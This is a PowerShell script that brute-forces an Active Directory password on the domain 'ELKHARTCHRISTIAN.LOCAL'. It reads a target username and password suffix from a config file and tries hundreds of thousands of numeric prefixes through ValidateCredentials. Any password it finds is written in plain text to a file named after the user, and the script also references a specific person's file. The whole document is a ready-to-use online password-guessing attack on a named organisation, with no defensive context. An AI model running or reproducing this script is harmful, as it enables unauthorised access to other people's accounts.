$val = 9999 # Start Value
$DomainName = "ELKHARTCHRISTIAN.LOCAL"

$UserName = (Get-Content -Path .\config.ini)[0]
$ending = (Get-Content -Path .\config.ini)[1]
$Password = [string]$val + $ending


if(Test-Path -Path .\temp.txt -PathType Leaf) {
            Remove-Item .\temp.txt
}

if(Test-Path -Path .\list\temp.txt -PathType Leaf) {
            Remove-Item .\list\temp.txt
}

Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$PC = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName)

while($val -ne 1000000) {
    $val++
    $Password = [string]$val + $ending

    $precent = [math]::Round(($val - 9999)/99999 * 100, 2)
    Write-Progress -Activity "Search in Progress" -Status "$precent% Complete:" -PercentComplete $precent

    if($PC.ValidateCredentials($UserName,$Password)) {
        Write-Progress -Activity "Search in Progress" -Status "$precent% Complete:" -PercentComplete 100

        cmd /c echo username:$UserName > .\list\temp.txt
        cmd /c echo password:$val$ending >> .\list\temp.txt

        if(Test-Path -Path .\list\jhelmuth.txt -PathType Leaf) {
            Remove-Item .\list\jhelmuth.txt
        }

        Rename-Item -Path ".\list\temp.txt" -NewName "$UserName.txt"

        exit
    }
}
